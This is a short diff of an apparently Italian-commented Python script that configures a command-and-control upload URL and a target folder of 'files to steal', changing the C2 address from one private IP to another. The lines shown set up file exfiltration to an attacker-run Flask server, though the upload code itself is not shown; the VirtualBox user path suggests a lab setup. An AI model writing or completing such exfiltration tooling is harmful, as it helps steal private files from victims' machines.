@@ -2,7 +2,7 @@ import os
 import requests
 
 # Configura il server C2 (modifica con il tuo IP)
-C2_URL = "http://192.168.1.100:5000/upload"  # L'IP del server Flask dove ricevi i file
+C2_URL = "http://10.0.2.15:5000/upload"  # L'IP del server Flask dove ricevi i file
 
 # Directory contenente i file da rubare
 TARGET_DIR = r"C:\Users\vboxuser\Desktop\prova"  # Cambia il percorso della cartella
